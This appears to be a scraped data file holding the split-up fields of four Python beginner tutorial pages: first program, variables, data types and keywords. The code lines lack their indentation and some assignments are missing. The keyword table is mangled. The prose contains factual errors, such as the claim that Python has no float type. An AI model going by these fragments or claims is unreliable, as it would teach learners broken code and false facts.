5,['First Python Program'],"['In this Section, we will discuss the basic syntax of Python, we will run a simple program to print Hello World on the console.']","['https://www.javatpoint.com/python-variables', 'https://www.javatpoint.com/how-to-install-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/how-to-install-pycharm-on-mac', 'https://www.javatpoint.com/https://www.javatpoint.com/how-to-install-pycharm-on-centos', 'https://www.javatpoint.com/https://www.javatpoint.com/how-to-install-pycharm-in-ubuntu', 'https://www.javatpoint.com/https://www.jetbrains.com/pycharm/download/download-thanks.html?platform=windows', 'https://www.javatpoint.com/https://www.javatpoint.com/c-programming-language-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/python-comments', 'https://www.javatpoint.com/how-to-install-pycharm-on-centos', 'https://www.javatpoint.com/how-to-install-pycharm-on-mac', 'https://www.javatpoint.com/how-to-install-pycharm-in-ubuntu', 'https://www.javatpoint.com/python-variables', 'https://www.javatpoint.com/how-to-install-python', 'https://www.javatpoint.com/python-variables']","['https://static.javatpoint.com/python/images/first-python-program.png', 'https://static.javatpoint.com/python/images/first-python-program2.png', 'https://static.javatpoint.com/python/images/first-python-program3.png', 'https://static.javatpoint.com/python/images/first-python-program4.png', 'https://static.javatpoint.com/python/images/first-python-program5.png', 'https://static.javatpoint.com/python/images/first-python-program6.png', 'https://static.javatpoint.com/python/images/first-python-program7.png', 'https://static.javatpoint.com/python/images/first-python-program8.png', 'https://static.javatpoint.com/python/images/first-python-program9.png', 'https://static.javatpoint.com/python/images/first-python-program10.png', 'https://static.javatpoint.com/python/images/first-python-program11.png', 'https://static.javatpoint.com/python/images/first-python-program-pycharm-installation.png', 'https://static.javatpoint.com/python/images/first-python-program-pycharm-installation2.png', 'https://static.javatpoint.com/python/images/first-python-program-pycharm-installation3.png', 'https://static.javatpoint.com/python/images/first-python-program-pycharm-installation4.png', 'https://static.javatpoint.com/python/images/first-python-program-pycharm-installation5.png', 'https://static.javatpoint.com/python/images/first-python-program-pycharm-installation6.png', 'https://static.javatpoint.com/python/images/first-python-program12.png']",[],"['Interactive interpreter prompt', 'Using a script file (Script Mode Programming)', 'Multi-line Statements', 'Get Started with PyCharm', 'PyCharm installation', 'Basic Syntax of Python', 'Python Identifiers']","['Pros and Cons of Script Mode', 'Windows ', 'Indentation and Comment in Python', 'Comments in Python', 'Types of Comment', 'CentOS', 'MacOS ', 'Ubuntu']",[],"['Python provides us the two ways to run a program:', ""Let's discuss each one of them in detail."", 'It will open the following prompt where we can execute the Python statement and check their impact on the console.', 'After writing the print statement, press the Enter key.', 'Here, we get the message ""Hello World !"" printed on the console.', 'To run this file named as first.py, we need to run the following command on the terminal.', 'Step - 1: Open the Python interactive shell, and click ""File"" then choose ""New"", it will open a new blank script in which we can write our code.', 'Step -2: Now, write the code and press ""Ctrl+S"" to save the file.', 'Step - 3: After saving the code, we can run it by clicking ""Run"" or ""Run Module"". It will display the output to the shell.', 'The output will be shown as follows.', 'Script File:', ""The script mode has few advantages and disadvantages as well. Let's understand the following advantages of running code in script mode."", ""Let's see the disadvantages of the script mode."", 'JetBrains provides the most popular and a widely used cross-platform IDE PyCharm to run the python programs.', 'To create a first program to Pycharm follows the following step.', 'Step - 1. Open Pycharm editor. Click on ""Create New Project"" option to create new project.', 'Step - 2. Select a location to save the project.', 'Step - 3. Click on ""File"" menu and select ""New"". By clicking ""New"" option it will show various file formats. Select the ""Python File"".', 'Step - 4. Now type the name of the Python file and click on ""OK"". We have written the ""FirstProgram"".', 'Step - 5. Now type the first program - print(""Hello World"") then click on the ""Run"" menu to run program.', 'Step - 6. The output will appear at the bottom of the screen.', 'Explanation:', 'We can add comment in each line of the Python code.', 'Python provides the facility to write comments in two ways- single line comment and multi-line comment.', 'Single-Line Comment - Single-Line comment starts with the hash # character followed by text for further explanation.', 'We can also write a comment next to a code statement. Consider the following example.', 'We can also use another way.', 'This is the basic introduction of the comments. Visit our Python Comment tutorial to learn it in detail.', ""Let's understand the following example.""]","['Python provides us the feature to execute the Python statement one by one at the interactive prompt. It is preferable in the case where we are concerned about the output of each line of our Python program.', 'To open the interactive mode, open the terminal (or command prompt) and type python (python3 in case if you have Python2 and Python3 both installed on your system).', 'The interpreter prompt is best to run the single-line statements of the code. However, we cannot write the code every-time on the terminal. It is not suitable to write multiple lines of code.', 'Step - 4: Apart from that, we can also run the file using the operating system terminal. But, we should be aware of the path of the directory where we have saved our file.', 'Multi-line statements are written into the notepad like an editor and saved it with .py extension. In the following example, we have defined the execution of the multiple code lines using the Python script.', 'Indentation is the most significant concept of the Python programming language. Improper use of indentation will end up ""IndentationError"" in our code.', 'Python indentation defines the particular group of statements belongs to the particular block. The programming languages such as C, C++, java use the curly braces {} to define code blocks.', ""In Python, statements that are the same level to the right belong to the same block. We can use four whitespaces to define indentation. Let's see the following lines of code."", ""In the above code, for loop has a code blocks and if the statement has its code block inside for loop. Both indented with four whitespaces. The last print() statement is not indented; that's means it doesn't belong to for loop."", 'It is good idea to add code in any line of the code section of code whose purpose is not obvious. This is a best practice to learn while doing the coding.', ""Multi-Line Comments - Python doesn't have explicit support for multi-line comments but we can use hash # character to the multiple lines. For example -"", 'Python identifiers refer to a name used to identify a variable, function, module, class, module or other objects. There are few rules to follow while naming the Python Variable.', 'We have defined the basic syntax of the Python programming language. We must be familiar with the core concept of any programming languages. Once we memorize the concepts as mentioned above. The journey of learning Python will become easier. ', 'To install PyCharm on CentOS, visit the link https://www.javatpoint.com/how-to-install-pycharm-on-centos. The link will guide you to install PyCharm on the CentOS. ', 'To install PyCharm on MacOS, visit the link https://www.javatpoint.com/how-to-install-pycharm-on-mac. The link will guide you to install PyCharm on the MacOS.', 'To install PyCharm on Ubuntu, visit the link https://www.javatpoint.com/how-to-install-pycharm-in-ubuntu. The link will guide you to install PyCharm on Ubuntu. ']","['Using the script mode, we can write multiple lines code into a file which can be executed later. For this purpose, we need to open an editor like notepad, create a file named and save it with .py extension, which stands for ""Python"". Now, we will implement the above example using the script mode.', 'In our first program, we have used gedit on our CentOS as an editor. On Windows, we have an alternative like notepad or notepad++ to edit the code. However, these editors are not used as IDE for python since they are unable to show the syntax related suggestions.', 'As we have already stated, PyCharm is a cross-platform IDE, and hence it can be installed on a variety of the operating systems. In this section of the tutorial, we will cover the installation process of PyCharm on Windows, MacOS, CentOS, and Ubuntu.', 'Installing PyCharm on Windows is very simple. To install PyCharm on Windows operating system, visit the link https://www.jetbrains.com/pycharm/download/download-thanks.html?platform=windows to download the executable installer. Double click the installer (.exe) file and install PyCharm by clicking next at each step. ', 'Indentation is nothing but adding whitespaces before the statement when it is needed. Without indentation Python doesn\'t know which statement to be executed to next. Indentation also defines which statements belong to which block. If there is no indentation or improper indentation, it will display ""IndentationError"" and interrupt our code.', 'Comments are essential for defining the code and help us and other to understand the code. By looking the comment, we can easily understand the intention of every line that we have written in code. We can also find the error very easily, fix them, and use in other applications.', ""In Python, we can apply comments using the # hash character. The Python interpreter entirely ignores the lines followed by a hash character. A good programmer always uses the comments to make code under stable. Let's see the following example of a comment.""]","['print (""hello world""); #here, we have used print() function to print the message on the console.', 'name = ""Andrew Venis""', 'branch = ""Computer Science""', 'age = ""25""', 'print(""My name is: "", name, )', 'print(""My age is: "", age)', 'list1 = [1, 2, 3, 4, 5]', 'for i in list1:', 'print(i)', 'if i==4:', 'break', 'print(""End of for loop"")', 'name  = ""Thomas""   # Assigning string value to the name variable', 'Fees = 10000      # defining course fees is 10000', 'Fees = 20000      # defining course fees is 20000', '# defining the marks of a student', 'Marks = 90', 'Name = ""James""   # the name of a student is James', ""Marks = 90            # defining student's marks"", 'Branch = ""Computer Science""   # defining student branch', '# we are defining for loop', '# To iterate the given list.', '# run this code.', 'This is an example', 'Of multi-line comment', 'Using triple-quotes', 'number = 10', 'print(num)', '_a = 100', 'print(_a)', 'x_y = 1000', 'print(x_y)']","['1\n2\n3\n4\nEnd of for loop', '10\n100\n1000']",[],"[""|||Using Interactive interpreter prompt|||Using a script file||||||Open the command line prompt and navigate to the directory.||||||We need to type the python keyword, followed by the file name and hit enter to run the Python file.||||||We can run multiple lines of code.|||Debugging is easy in script mode.|||It is appropriate for beginners and also for experts.||||||We have to save the code every time if we make any change in the code.|||It can be tedious when we run a single or a few lines of code.||||||A variable name must start with either an English letter or underscore (_).|||A variable name cannot start with the number.|||Special characters are not allowed in the variable name.|||The variable's name is case sensitive.|||""]"
6,['Python Variables'],['Variable is a name that is used to refer to memory location. Python variable is also known as an identifier and used to hold value.'],"['https://www.javatpoint.com/python-data-types', 'https://www.javatpoint.com/python-example', 'https://www.javatpoint.com/python-data-types', 'https://www.javatpoint.com/python-example', 'https://www.javatpoint.com/python-data-types']","['https://static.javatpoint.com/python/images/python-variables.png', 'https://static.javatpoint.com/python/images/python-variables2.png', 'https://static.javatpoint.com/python/images/python-variables3.png']",[],"['Identifier Naming', 'Declaring Variable and Assigning Values', 'Object References', 'Object Identity', 'Variable Names', 'Multiple Assignment', 'Python Variable Types', 'Delete a variable', 'Maximum Possible Value of an Integer in Python', 'Basic Fundamentals:']","['Local Variable', 'Global Variables', 'Print Single and Multiple Variables in Python']",[],"[""In Python, we don't need to specify the type of variable because Python is a infer language and smart enough to get variable type."", 'Variable names can be a group of both the letters and digits, but they have to begin with a letter or an underscore.', 'It is recommended to use lowercase letters for the variable name. Rahul and rahul both are two different variables.', 'Python does not bind us to declare a variable before using it in the application. It allows us to create a variable at the required time.', ""We don't need to declare explicitly variable in Python. When we assign any value to the variable, that variable is declared automatically."", 'The equal (=) operator is used to assign value to a variable.', 'In Python, variables are a symbolic name that is a reference or pointer to an object. The variables are used to denote objects by that name.', ""Let's understand the following example"", 'In the above image, the variable a refers to an integer object.', 'Suppose we assign the integer value 50 to a new variable b.', 'The variable b refers to the same object that a points to because Python does not create another object.', ""Let's assign the new value to b. Now both variables will refer to the different objects."", 'Python manages memory efficiently if we assign the same variable to two different values.', 'Consider the following valid variables name.', 'The multi-word keywords can be created by the following method.', 'Python allows us to assign a value to multiple variables in a single statement, which is also known as multiple assignments.', '1. Assigning single value to multiple variables', '2. Assigning multiple values to multiple variables:', 'The values will be assigned in the order in which variables appear.', ""There are two types of variables in Python - Local variable and Global variable. Let's understand the following variables."", ""Local variables are the variables that declared inside the function and have scope within the function. Let's understand the following example."", 'Explanation:', 'We tried to use local variable outside their scope; it threw the NameError.', 'Explanation:', 'Now, we called the function and proceeded to print x. It printed the as newly assigned value of x.', 'We can delete the variable using the del keyword. The syntax is given below.', ""Python doesn't have any special data type to store larger numbers."", 'We can print multiple variables within the single print statement. Below are the example of single and multiple printing values.', 'Example - 1 (Printing Single Variable)', 'Example - 2 (Printing Multiple Variables)', 'This section contains the fundamentals of Python, such as:', 'i)Tokens and their types.', 'ii) Comments', 'There are following tokens in Python:', 'We will discuss above the tokens in detail next tutorials.']","['Variables are the example of identifiers. An Identifier is used to identify the literals used in the program. The rules to name an identifier are given below.', 'It is necessary to understand how the Python interpreter works when we declare a variable. The process of treating variables is somewhat different from many other programming languages.', ""Python is the highly object-oriented programming language; that's why every data item belongs to a specific type of class. Consider the following example."", ""The Python object creates an integer object and displays it to the console. In the above print statement, we have created a string object. Let's check the type of it using the Python built-in type() function."", 'In Python, every created object identifies uniquely in Python. Python provides the guaranteed that no two objects will have the same identifier. The built-in id() function, is used to identify the object identifier. Consider the following example.', 'We assigned the b = a, a and b both point to the same object. When we checked by the id() function it returned the same number. We reassign a to 500; then it referred to the new object identifier.', 'We have already discussed how to declare the valid variable. Variable names can be any length can have uppercase, lowercase (A to Z, a to z), the digit (0-9), and underscore character(_). Consider the following example of valid variables names.', 'In the above example, we have declared a few valid variable names such as name, _name_ , etc. But it is not recommended because when we try to read code, it may create confusion. The variable name should be descriptive to make code more readable.', 'We can apply multiple assignments in two ways, either by assigning a single value to multiple variables or assigning multiple values to multiple variables. Consider the following example.', 'Global variables can be used throughout the program, and its scope is in the entire program. We can use global variables inside or outside the function.', 'In the following example, we create a variable x and assign value to it. We deleted variable x, and print it, we get the error ""variable x is not defined"". The variable x will no longer use in future.', 'As we can see in the above example, we assigned a large integer value to variable x and checked its type. It printed class <int> not long int. Hence, there is no limitation number by bits and we can expand to the limit of our memory.']","['In the above code, we declared a function named add() and assigned a few variables within the function. These variables will be referred to as the local variables which have scope only inside the function. If we try to use them outside the function, we get a following error.', ""A variable declared outside the function is the global variable by default. Python provides the global keyword to use global variable inside the function. If we don't use the global keyword, the function treats it as a local variable. Let's understand the following example."", 'In the above code, we declare a global variable x and assign a value to it. Next, we defined a function and accessed the declared variable using the global keyword inside the function. Now we can modify its value. Then, we assigned a new string value to the variable x.', ""Unlike the other programming languages, Python doesn't have long int or float data types. It treats all integer values as an int data type. Here, the question arises. What is the maximum possible value can hold by the variable in Python? Consider the following example.""]","['print(""John"")', 'type(""John"")', 'print(id(a))', 'print(id(b))', '# Reassigned variable a', 'print(id(a))', 'name = ""Devansh""', 'age = 20', 'marks = 80.50', 'print(name)', 'print(age)', 'print(marks)', 'name = ""A""', 'Name = ""B""', 'naMe = ""C""', 'NAME = ""D""', 'n_a_m_e = ""E""', '_name = ""F""', 'name_ = ""G""', '_name_ = ""H""', 'na56me = ""I""', 'print(name,Name,naMe,NAME,n_a_m_e, NAME, n_a_m_e, _name, name_,_name, na56me)', 'x=y=z=50', 'print(x)', 'print(y)', 'print(z)', 'a,b,c=5,10,15', 'print a', 'print b', 'print c', '# Declaring a function', 'def add():', '# Defining local variables. They has scope only within a function', 'a = 20', 'b = 30', 'c = a + b', 'print(""The sum is:"", c)', '# Calling a function', '# Accessing local variable outside the function', 'print(a)', '# Declare a variable and initialize it', '# Global variable in function', 'def mainFunction():', '# printing a global variable', 'global x', 'print(x)', '# modifying a global variable', ""x = 'Welcome To Javatpoint'"", 'print(x)', 'mainFunction()', 'print(x)', 'del <variable_name>', '# Assigning a value to x', 'print(x)', '# deleting a variable.', 'print(x)', '# A Python program to display that we can store', '# large numbers in Python', 'a = 10000000000000000000000000000000000000000000', 'a = a + 1', 'print(type(a))', 'print (a)', '# printing single value', 'print(a)', 'print((a))', '# printing multiple variables', 'print(a,b)', '# separate the variables by the comma', 'Print(1, 2, 3, 4, 5, 6, 7, 8)']","['John', ""<class 'str'>"", '140734982691168\n140734982691168\n2822056960944', 'Devansh\n20\n80.5', 'A B C D E D E F G F I', '50  \n50  \n50', '5  \n10  \n15', 'The sum is: 50', ""The sum is: 50\n    print(a)\nNameError: name 'a' is not defined"", '101\nWelcome To Javatpoint\nWelcome To Javatpoint', '6\nTraceback (most recent call last):\n  File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/multiprocessing.py"", line 389, in \n    print(x)\nNameError: name \'x\' is not defined', ""<class 'int'>\n10000000000000000000000000000000000000000001"", '5\n5', '5 6\n1 2 3 4 5 6 7 8']",[],"['|||The first character of the variable must be an alphabet or underscore ( _ ).|||All the characters except the first character may be an alphabet of lower-case(a-z), upper-case (A-Z), underscore, or digit (0-9).|||Identifier name must not contain any white-space, or special character (!, @, #, %, ^, &, *).|||Identifier name must not be similar to any keyword defined in the language.|||Identifier names are case sensitive; for example, my name, and MyName is not the same.|||Examples of valid identifiers: a123, _n, n_9, etc.|||Examples of invalid identifiers: 1a, n%4, n 9, etc.||||||Camel Case - In the camel case, each word or abbreviation in the middle of begins with a capital letter. There is no intervention of whitespace. For example - nameOfStudent, valueOfVaraible, etc.|||Pascal Case - It is the same as the Camel Case, but here the first word is also capital. For example - NameOfStudent, etc.|||Snake Case - In the snake case, Words are separated by the underscore. For example - name_of_student, etc.||||||The tokens can be defined as a punctuator mark, reserved words, and each word in a statement.|||The token is the smallest unit inside the given program.||||||Keywords.|||Identifiers.|||Literals.|||Operators.|||']"
7,['Python Data Types'],"['Variables can hold values, and every value has a data-type. Python is a dynamically typed language; hence we do not need to define the type of the variable while declaring it. The interpreter implicitly binds the value with its type.']","['https://www.javatpoint.com/python-keywords', 'https://www.javatpoint.com/python-variables', 'https://www.javatpoint.com/#numbers', 'https://www.javatpoint.com/#SequenceType', 'https://www.javatpoint.com/#Boolean', 'https://www.javatpoint.com/#Set', 'https://www.javatpoint.com/#dictionary', 'https://www.javatpoint.com/python-keywords', 'https://www.javatpoint.com/python-variables', 'https://www.javatpoint.com/python-keywords']",['https://static.javatpoint.com/python/images/python-data-types.png'],[],['Standard data types'],"['Numbers', 'Sequence Type', 'String', 'List', 'Tuple', 'Dictionary', 'Boolean', 'Set']",[],"['Consider the following example to define the values of different data types and checking its type.', ""A variable can hold different types of values. For example, a person's name must be stored as a string whereas its id must be stored as an integer."", 'Python provides various standard data types that define the storage method on each of them. The data types defined in Python are given below.', 'Python creates Number objects when a number is assigned to a variable. For example;', 'Python supports three types of numeric data.', 'String handling in Python is a straightforward task since Python provides built-in functions and operators to perform operations in the string.', 'In the case of string handling, the operator + is used to concatenate two strings as the operation ""hello""+"" python"" returns ""hello python"".', 'The operator * is known as a repetition operator as the operation ""Python"" *2 returns \'Python Python\'.', 'The following example illustrates the string in Python.', 'Example - 1', 'Consider the following example of string handling.', 'Example - 2', 'Consider the following example.', ""A tuple is a read-only data structure as we can't modify the size and value of the items of a tuple."", ""Let's see a simple example of the tuple."", 'The items in the dictionary are separated with the comma (,) and enclosed in the curly braces {}.', 'Consider the following example.']","['The variable a holds integer value five and we did not define its type. Python interpreter will automatically interpret variables a as an integer type.', 'Python enables us to check the type of the variable used in the program. Python provides us the type() function, which returns the type of the variable passed.', 'In this section of the tutorial, we will give a brief introduction of the above data-types. We will discuss each one of them in detail later in this tutorial.', 'The string can be defined as the sequence of characters represented in the quotation marks. In Python, we can use single, double, or triple quotes to define a string.', 'Python Lists are similar to arrays in C. However, the list can contain data of different types. The items stored in the list are separated with a comma (,) and enclosed within square brackets [].', 'We can use slice [:] operators to access the data of the list. The concatenation operator (+) and repetition operator (*) works with the list in the same way as they were working with the strings.', 'A tuple is similar to the list in many ways. Like lists, tuples also contain the collection of the items of different data types. The items of the tuple are separated with a comma (,) and enclosed in parentheses ().', 'Dictionary is an unordered set of a key-value pair of items. It is like an associative array or a hash table where each key stores a specific value. Key can hold any primitive data type, whereas value is an arbitrary Python object.']","['Number stores numeric values. The integer, float, and complex values belong to a Python Numbers data-type. Python provides the type() function to know the data-type of the variable. Similarly, the isinstance() function is used to check an object belongs to a particular class.', ""Boolean type provides two built-in values, True and False. These values are used to determine the given statement true or false. It denotes by the class bool. True can be represented by any non-zero value or 'T' whereas false can be represented by the 0 or 'F'. Consider the following example."", 'Python Set is the unordered collection of the data type. It is iterable, mutable(can modify after creation), and has unique elements. In set, the order of the elements is undefined; it may return the changed sequence of the element. The set is created by using a built-in function set(), or a sequence of elements is passed in the curly braces and separated by the comma. It can contain various types of values. Consider the following example.']","['b=""Hi Python""', 'c = 10.5', 'print(type(a))', 'print(type(b))', 'print(type(c))', 'print(""The type of a"", type(a))', 'b = 40.5', 'print(""The type of b"", type(b))', 'c = 1+3j', 'print(""The type of c"", type(c))', 'print("" c is a complex number"", isinstance(1+3j,complex))', 'str = ""string using double quotes""', 'print(str)', ""s = '''A multiline"", ""string'''"", 'print(s)', ""str1 = 'hello javatpoint' #string str1"", ""str2 = ' how are you' #string str2"", 'print (str1[0:2]) #printing first two character using slice operator', 'print (str1[4]) #printing 4th character of the string', 'print (str1*2) #printing the string twice', 'print (str1 + str2) #printing the concatenation of str1 and str2', 'list1  = [1, ""hi"", ""Python"", 2]', '#Checking type of given list', 'print(type(list1))', '#Printing the list1', 'print (list1)', '# List slicing', 'print (list1[3:])', '# List slicing', 'print (list1[0:2])', '# List Concatenation using + operator', 'print (list1 + list1)', '# List repetation using * operator', 'print (list1 * 3)', 'tup  = (""hi"", ""Python"", 2)', '# Checking type of tup', 'print (type(tup))', '#Printing the tuple', 'print (tup)', '# Tuple slicing', 'print (tup[1:])', 'print (tup[0:1])', '# Tuple concatenation using + operator', 'print (tup + tup)', '# Tuple repatation using * operator', 'print (tup * 3)', '# Adding value to tup. It will throw an error.', 't[2] = ""hi""', ""d = {1:'Jimmy', 2:'Alex', 3:'john', 4:'mike'}"", '# Printing dictionary', 'print (d)', '# Accesing value using keys', 'print(""1st name is ""+d[1])', 'print(""2nd name is ""+ d[4])', 'print (d.keys())', 'print (d.values())', '# Python program to check the boolean type', 'print(type(True))', 'print(type(False))', 'print(false)', '# Creating Empty set', 'set1 = set()', ""set2 = {'James', 2, 3,'Python'}"", '#Printing Set value', 'print(set2)', '# Adding element to the set', 'set2.add(10)', 'print(set2)', '#Removing element from the set', 'set2.remove(2)', 'print(set2)']","[""<type 'int'>\n<type 'str'>\n<type 'float'>"", ""The type of a <class 'int'>\nThe type of b <class 'float'>\nThe type of c <class 'complex'>\nc is complex number: True"", 'string using double quotes\nA multiline\nstring', 'he\no\nhello javatpointhello javatpoint\nhello javatpoint how are you', ""[1, 'hi', 'Python', 2]\n[2]\n[1, 'hi']\n[1, 'hi', 'Python', 2, 1, 'hi', 'Python', 2]\n[1, 'hi', 'Python', 2, 1, 'hi', 'Python', 2, 1, 'hi', 'Python', 2]"", '<class \'tuple\'>\n(\'hi\', \'Python\', 2)\n(\'Python\', 2)\n(\'hi\',)\n(\'hi\', \'Python\', 2, \'hi\', \'Python\', 2)\n(\'hi\', \'Python\', 2, \'hi\', \'Python\', 2, \'hi\', \'Python\', 2)\n\nTraceback (most recent call last):\n  File ""main.py"", line 14, in <module>\n    t[2] = ""hi"";\nTypeError: \'tuple\' object does not support item assignment', ""1st name is Jimmy\n2nd name is mike\n{1: 'Jimmy', 2: 'Alex', 3: 'john', 4: 'mike'}\ndict_keys([1, 2, 3, 4])\ndict_values(['Jimmy', 'Alex', 'john', 'mike'])"", ""<class 'bool'>\n<class 'bool'>\nNameError: name 'false' is not defined"", ""{3, 'Python', 'James', 2}\n{'Python', 'James', 3, 2, 10}\n{'Python', 'James', 3, 10}""]",[],"['|||Numbers|||Sequence Type|||Boolean|||Set|||Dictionary||||||Int - Integer value can be any length such as integers 10, 2, 29, -20, -150 etc. Python has no restriction on the length of an integer. Its value belongs to int|||Float - Float is used to store floating-point numbers like 1.9, 9.902, 15.2, etc. It is accurate upto 15 decimal points.|||complex - A complex number contains an ordered pair, i.e., x + iy where x and y denote the real and imaginary parts, respectively. The complex numbers like 2.14j, 2.0 + 2.3j, etc.|||']"
8,['Python Keywords'],"[""Python Keywords are special reserved words that convey a special meaning to the compiler/interpreter. Each keyword has a special meaning and a specific operation. These keywords can't be used as a variable. Following is the List of Python Keywords.""]","['https://www.javatpoint.com/python-literals', 'https://www.javatpoint.com/python-data-types', 'https://www.javatpoint.com/python-literals', 'https://www.javatpoint.com/python-data-types', 'https://www.javatpoint.com/python-literals']",[],[],[],[],['Note: A mutable data-types do not refer to the same object.'],"['Consider the following explanation of keywords.', '5. or - It is a logical operator in Python. It returns true if one of the conditions is true. Consider the following truth table.', '6. not - It is a logical operator and inverts the truth value. Consider the following truth table.', '8. def - This keyword is used to declare the function in Python. If followed by the function name.', '10. continue - It is used to stop the execution of the current iteration. Consider the following example.', '11. break - It is used to terminate the loop execution and control transfer to the end of the loop. Consider the following example.', '15. del - It is used to delete the reference of the object. Consider the following example.', '16. try, except - The try-except is used to handle the exceptions. The exceptions are run-time errors. Consider the following example.', '17. raise - The raise keyword is used to through the exception forcefully. Consider the following example.', 'Example: For loop', 'Example: While loop', '20. import - The import keyword is used to import modules in the current Python script. The module contains a runnable Python code.', '21. from - This keyword is used to import the specific function or attributes in the current Python script.', '22. as - It is used to create a name alias. It provides the user-define name while importing a module.', '24. return - The return keyword is used to return the result value or none to called function.', 'We have covered all Python keywords. This is the brief introduction of Python Keywords. We will learn more in the upcoming tutorials.']","['7. assert - This keyword is used as the debugging tool in Python. It checks the correctness of the code. It raises an AssertionError if found any error in the code and also prints the message with an error.', '9. class - It is used to represents the class in Python. The class is the blueprint of the objects. It is the collection of the variable and methods. Consider the following class.', '12. If - It is used to represent the conditional statement. The execution of a particular block is decided by if statement. Consider the following example.', '13. else - The else statement is used with the if statement. When if statement returns false, then else block is executed. Consider the following example.', '14. elif - This Keyword is used to check the multiple conditions. It is short for else-if. If the previous condition is false, then check until the true condition is found. Condition the following example.', '18. finally - The finally keyword is used to create a block of code that will always be executed no matter the else block raises an error or not. Consider the following example.', '19. for, while - Both keywords are used for iteration. The for keyword is used to iterate over the sequences (list, tuple, dictionary, string). A while loop is executed until the condition returns false. Consider the following example.', '23. pass - The pass keyword is used to execute nothing or create a placeholder for future code. If we declare an empty class or function, it will through an error, so we use the pass keyword to declare an empty class or function.', '25. is - This keyword is used to check if the two-variable refers to the same object. It returns the true if they refer to the same object otherwise false. Consider the following example.', '26. global - The global keyword is used to create a global variable inside the function. Any function can access the global. Consider the following example.', '27. nonlocal - The nonlocal is similar to the global and used to work with a variable inside the nested function(function inside a function). Consider the following example.', '28. lambda - The lambda keyword is used to create the anonymous function in Python. It is an inline function without a name. Consider the following example.', ""29. yield - The yield keyword is used with the Python generator. It stops the function's execution and returns value to the caller. Consider the following example."", ""30. with - The with keyword is used in the exception handling. It makes code cleaner and more readable. The advantage of using with, we don't need to call close(). Consider the following example."", '31. None - The None keyword is used to define the null value. It is remembered that None does not indicate 0, false, or any empty data-types. It is an object of its data type, which is Consider the following example.']",[],"[""print('a is dividing by Zero')"", 'assert b != 0', 'print(a / b)', 'def my_func(a,b):', 'c = a+b', 'print(c)', 'my_func(10,20)', 'class Myclass:', '#Variables……..', 'def function_name(self):', '#statements………', 'while a < 4:', 'a += 1', 'if a == 2:', 'continue', 'print(a)', 'for i in range(5):', 'if(i==3):', 'break', 'print(i)', 'print(""End of execution"")', 'if (1 < 12):', 'print(""I am less than 18"")', 'if(n%2 == 0):', 'print(""Even"")', 'print(""odd"")', 'marks = int(input(""Enter the marks:""))', 'if(marks>=90):', 'print(""Excellent"")', 'elif(marks<90 and marks>=75):', 'print(""Very Good"")', 'elif(marks<75 and marks>=60):', 'print(""Good"")', 'print(""Average"")', 'print(b)', '# a is no longer exist', 'print(a)', 'b = 1/a', 'except Exception as e:', 'print(e)', 'if (a>2):', ""raise Exception('a should not exceed 2 ')"", 'c = b/a', 'print(c)', 'except Exception as e:', 'print(e)', 'finally:', ""print('Finally always executed')"", 'list = [1,2,3,4,5]', 'for i in list:', 'print(i)', 'while(a<5):', 'print(a)', 'a = a+1', 'import math', 'print(math.sqrt(25))', 'from math import sqrt', 'print(sqrt(25))', 'import calendar as cal', 'print(cal.month_name[5])', 'class my_class:', 'def my_func():', 'def sum(a,b):', 'c = a+b', 'return c', 'print(""The sum is:"",sum(25,15))', 'print(x is y)', 'print(a is b)', 'def my_func():', 'global a', 'a = 10', 'b = 20', 'c = a+b', 'print(c)', 'my_func()', 'def func():', 'print(a)', 'def outside_function():', 'a = 20', 'def inside_function():', 'nonlocal a', 'a = 30', 'print(""Inner function: "",a)', 'inside_function()', 'print(""Outer function: "",a)', 'outside_function()', 'a = lambda x: x**2', 'for i in range(1,6):', 'print(a(i))', 'def fun_Generator():', 'yield 1', 'yield 2', 'yield 3', '# Driver code to check above generator function', 'for value in fun_Generator():', 'print(value)', ""with open('file_path', 'w') as file:"", ""file.write('hello world !')"", 'def return_none():', 'a = 10', 'b = 20', 'c = a + b', 'x = return_none()', 'print(x)']","['a is dividing by Zero', 'Runtime Exception:', 'Traceback (most recent call last):', 'File ""/home/40545678b342ce3b70beb1224bed345f.py"", line 4, in', 'assert b != 0, ""Divide by 0 error""', 'AssertionError: Divide by 0 error', '30', '1', '3', '4', '0', '1', '2', 'End of execution', 'I am less than 18', 'Odd', 'Enter the marks:85', 'Very Good', '12', ""NameError: name 'a' is not defined"", 'division by zero', 'Exception: a should not exceed 2', 'division by zero', 'Finally always executed', '1', '2', '3', '4', '5', '0', '1', '2', '3', '4', '5', '5', 'May', 'The sum is: 40', 'True', 'False', '30', '10', 'Inner function:  30', 'Outer function:  30', '1', '4', '9', '16', '25', '1', '2', '3', 'None']","['rueFalseNoneanda&&&ssetdefclasscontinuebrea&&&lsefinallyelifdelexcep&&&lobalforiffromimpor&&&aisetryorreturnpas&&&onlocalinnotislambd', 'A|||B|||A and B&&&True|||True|||True&&&True|||False|||False&&&False|||True|||False&&&False|||False|||False', 'A|||B|||A and B&&&True|||True|||True&&&True|||False|||True&&&False|||True|||True&&&False|||False|||False', 'A|||Not A&&&True|||False&&&False|||True']","['|||True - It represents the Boolean true, if the given condition is true, then it returns ""True"". Non-zero values are treated as true.|||False - It represents the Boolean false; if the given condition is false, then it returns ""False"". Zero value is treated as false|||None - It denotes the null value or void. An empty list or Zero can\'t be treated as None.|||and - It is a logical operator. It is used to check the multiple conditions. It returns true if both conditions are true. Consider the following truth table.|||']"
